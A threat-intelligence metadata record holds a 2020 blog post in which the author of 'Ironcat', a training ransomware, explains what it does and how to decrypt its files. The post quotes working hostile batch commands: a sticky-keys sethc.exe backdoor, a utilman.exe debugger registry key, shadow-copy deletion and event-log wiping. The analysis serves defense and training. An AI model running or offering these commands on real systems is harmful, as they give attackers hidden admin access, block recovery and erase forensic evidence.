{
    "id": "500a7e01-bda6-48cb-a2a1-99184a97bd53",
    "created_at": "2023-01-12T15:01:34.923811Z",
    "updated_at": "2025-03-27T02:05:18.318816Z",
    "deleted_at": null,
    "sha1_hash": "02444a4341490bf547a12e45da0d28c3a7c97ab0",
    "title": "2020-09-26 - Ironcat Ransomware",
    "authors": "",
    "file_creation_date": "2022-05-28T18:28:56Z",
    "file_modification_date": "2022-05-28T18:28:56Z",
    "file_size": 4777411,
    "plain_text": "# Ironcat Ransmoware\n\n**[aaronrosenmund.com/blog/2020/09/26/ironcat-ransmoware/](https://aaronrosenmund.com/blog/2020/09/26/ironcat-ransmoware/)**\n\n## I am Ironcat\n\nBy Aaron Rosenmund @arosenmund | Saturday, September 26, 2020\n\n## Ironcat Ransomware\n\nI am ironcat, and you're not.\n\nPhoto: Aaron Rosenmund aka. IRONCAT\n\n\nSeptember 26, 2020\n\n\nHello cyber family! Today’s topic is ransomware, specifically ransomware authors. Some of\nyou may have noticed a new variant of ransomware, written in go, and leaving a note\nresembling Sodinokibi or REevil strains. Some have even dubbed this IronCat ransomware,\n\n\n-----\n\nbecause of the Ironcat related strings listed when your run or analyze the binary.\n\nLet me start by saying this. I am Ironcat, and I wrote this program, and various binaries\nreleased, for training purposes only.\n\nThese binaries was created for the sole purpose of being used on a closed cyber range for\ntraining purposes only. I call it a binary because this was never written to be malicious\nmalware, or even intended to be shared publicly. I wrote Ironcat ransomware to use in\nadvanced in person training and personal research into detection methods.\n\nI am a heavily invested in the cyber security community as a purple teamer, researcher, and\ntrainer, and have never leveraged this binary for any purpose other than to use on training\ndevices that I owned personally or had full permissions to use. These systems have been\nclosed cyber ranges and closed networks with environments that are later completely wiped.\n\nDuring the course of a practical exercise a student removed the binaries and uploaded them\nto VirusTotal, and now I feel that it is my responsibility to release the analysis of the malware,\nwhat it does, how it operates, and how to decrypt it!\n\n## Ironcat Ransomware Properties\n\nSo because I wrote every bit of the code, I can provide a full analysis of everything this\nbinary does. Starting with the variations and hashes that could have potentially been leaked.\n\n**file name** **MD5 Hash** **encryption target**\n\n\niaiusers.exe\n\niaiinetpub.exe\n\n\n6EB69ACD2AC82BE838C8B3D8910B0D70 C:\\Users\n\n2C277D84A4A040449B8E887085B5EAB9 C:\\inetpub\n\n\niai-sql.exe 948C7355D80C0A2B361911096BF24F52 C:\\Program Files\\Microsoft\nSQL Server\\\n\niai-file.exe 0F2AB584214EF410A7543506D6A47B1A C:\\Prestige\n\nThese were developed to surgically hit specific targets in the training environment.\n\nTo be effective the binary must be run as an administrator. It will fail to complete some of the\nmore dangerous actions if only ran with user privilege. There is no privilege escalation or\nbypass mechanisms built in to this set of binaries.\n\n## Runtime activities\n\n\n-----\n\nTo run this binary properly you must supply two arguments the mode encrypt/decrpt and then\na passphrase.\n\nc:> iai-users.exe encrypt password\nPhoto: Aaron Rosenmund aka. IRONCAT\n\n_When ran with these arguments the following actions occur:_\n\n### HTTP POST sent to Fakebook.com\n\nA packet is sent to (fakebook.com), a training environment site.\n\n_If fakebook.com is not available the binary will fail to run with an error code_\n\nThe packet contains the followoing:\n\nA value called “forwarder” that contains the IP (58.247.181.118); This value was\nused to test trainees on not jumping to quickly to attribution. This IP is hardcoded\nand the value performs no purpose. Forwarder IP’s are only useful in the\n**_header of the http packet, this is just red herring._**\nA key which is the password in a bas64 encoded string\nThe word “tazerface” to simulate a variant name. It is really just a funny name\n**_from guardians of the galaxy 2_**\n\nPhoto: Aaron Rosenmund aka. IRONCAT\n\n### Files Are Read and Encrypted\n\nEvery file in the target directory is read. As directories are found, the note with the name\n**_pay_the_piper.txt is dropped in each one._**\n\nThis note was nearly a direct copy fromm a real REevil ransomware response note. This was\nintended to provide realism to the training experience, and again to provide the opportunity\nfor show malware forensics specialists that they have to look past the note to identify the\n\n\n-----\n\nmalware type and activity. This was another red herring.\n\nThis seems to have also been a good lessen for not just the individuals that I intended\nto train, but to everyone and thing(analysis sites) that I have found attempting to\nanalyse the malware in the wild. What do I mean by this? I will cover some emergent\nfindings from the perspective of seeing malware I wrote line by line being uploaded to\nanalysis engines. The good and the bad, but that will be in a separate article.\n\nWhat I want to cover right now relates to the danger of this binary being reused. Part of the\nrealistic training environment, included devices with patched anti-virus. In testing the only\nversion of the binary that was caught by antivirus, was the version that included the note that\nmimics the Sodinokohibi/REevil actor. This is hard coded into the binary, and can be patched\neven without source code to create a binary not only with a different hash, but that will not\nregister as a threat with anti-virus that is merely scanning the binary for signatures(most antivirus).\n\nThe files are then encrypted with the “.encrypted” extension which changes the registered file\ntype in windows to “ENCRYPTED”\n\nPhoto: Aaron Rosenmund aka. IRONCAT\n\n### Back doors and Detection Evasion\n\nAfter all the files are encrypted, the binary drops four batch files into the `C:\\Windows`\ndirectory\n\nEach with a different function.\n\n“Chtes.bat” `copy c:\\Windows\\System32\\sethc.exe c:\\Windows\\System32\\sethc.old`\n```\n&& && del c:\\Windows\\System32\\sethc.exe && copy c:\\Windows\\System32\\cmd.exe\nc:\\Windows\\System32\\sethc.exe\n\n```\nAllows actors to press any key 5 times at the logon screen and launch an\nadministrative cmd.exe console.\n\n“Netlogin.bat” `REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows`\n```\nNT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /f /v Debugger\n/t REG SZ /d \"%windir%\\system32\\cmd.exe\"\n\n```\n\n-----\n\nAdds a reg key to launch a administrative cmd.exe console whenever utilman.exe is\nlaunched, by passing logon screens and user limitations.\n\n“Shadow.bat” `cmd /C vssadmin delete shadows /all`\n\nDeletes all VSS that could be used to recover the data.\n\n“mssupdate.bat” `FOR /F \"delims=\" %%I IN ('WEVTUTIL EL') DO (WEVTUTIL CL`\n```\n\"%%I\")\n\n```\nDeletes all windows event logs.\n\nPhoto: Aaron Rosenmund aka. IRONCAT\n\n## But how do you decrypt the data?\n\nTo decrypt the data, the binary functions in exactly the same way, except using the decrypt\nfunction, and the same password used to encrypt the data.\n\n```\niai-users.exe decrypt password\n\n```\n\nThe binary still needs access to the fakebook.com IP or it will fail, this function happens\nprior to reading the files and decrypting.\n\nThere are 3 potential ways to get the password used to encrypt the data:\n\n1. Capture the HTTP POST request containing the base64 encoded data and reverse the\n\nencoding.(Can be done many ways, Cyberchef is an easy example.) You will have to\n_have packet capture setup before the the binary was executed._\n2. Capture the windows event security log entry containing the command line used to\n\nlaunch the binary. If the last batch file did not run due to permissions, you may still have\n_this on the device. Otherwise it was wiped. If you pull logs into a SIEM they may still be_\n_there._\n\n\n-----\n\n3. On the devices if conhost.exe is still running and you can access the console window\n\nthat binary was originally ran in, you can use the `doskey /history command to list`\nout the command and password used to run the encryption. The actor would have to\n_have left the conhost.exe up, and you would need to log into the same session._\n\nIf you can find the password through any of these methods, you will be able to run the binary\non the devices with Administrative privileges, and it will decrypt the files in the location it was\nhard coded for, based on the variant listed in the properties section of this blog.\n\n## Why does the binary not run properly?\n\nAs part of the training, there are various features built into the binary to guide you through\ndeductive reasoning to make educated guesses at the requirement of arguments and\nidentification of artifacts.\n\n### Running the binary with no arguments\n\nIf you run the executable with no arguments, it will check for that and give you a response to\nlet you know that you are not ironcat, but I am:\n\nPhoto: Aaron Rosenmund aka. IRONCAT\n\n### Running the Binary with incorrect arguments\n\nIf you run the executable with two arguments, but the wrong arguments, the application will\nexec with an error.\n\n\n-----\n\nPhoto: Aaron Rosenmund aka. IRONCAT\n\n### Running the binary with incorrect password\n\nIf you run the binaries decrypt function with an incorrect password. It will run through all of\nthe same steps for encryption, but does nothing to the encrypted files. It will however, print\nout another message about Ironcat’s love for cheeseburgers and politely asking for one.\n\nPhoto: Aaron Rosenmund aka. IRONCAT\n\n## Conclusion\n\nAt this point this, Ironcat malware is out there, has a name, a family category, and because it\nhas been uploaded to virus total, is available for anyone to download and use. Update your\nsignatures, increase your ability to catch logs, and please use the contents of this blog\nexposing the internal operation of ironcat ransomware to ensure that no one can use these\nbinaries to cause damage. There is no persistance, or callbacks, and if you so desire, feel\nfree to use these samples for training, detection development, and malware analysis\npractice It is like a test with all the answers already in this blog\n\n\n-----\n\n### References:\n\n← Previous\n[Next →](https://aaronrosenmund.com/blog/2021/01/02/phishing-a-shark/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-26 - Ironcat Ransomware.pdf"
    ],
    "report_names": [
        "2020-09-26 - Ironcat Ransomware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535694,
    "ts_updated_at": 1743041118,
    "ts_creation_date": 1653762536,
    "ts_modification_date": 1653762536,
    "files": {
        "pdf": "https://archive.orkl.eu/02444a4341490bf547a12e45da0d28c3a7c97ab0.pdf",
        "text": "https://archive.orkl.eu/02444a4341490bf547a12e45da0d28c3a7c97ab0.txt",
        "img": "https://archive.orkl.eu/02444a4341490bf547a12e45da0d28c3a7c97ab0.jpg"
    }
}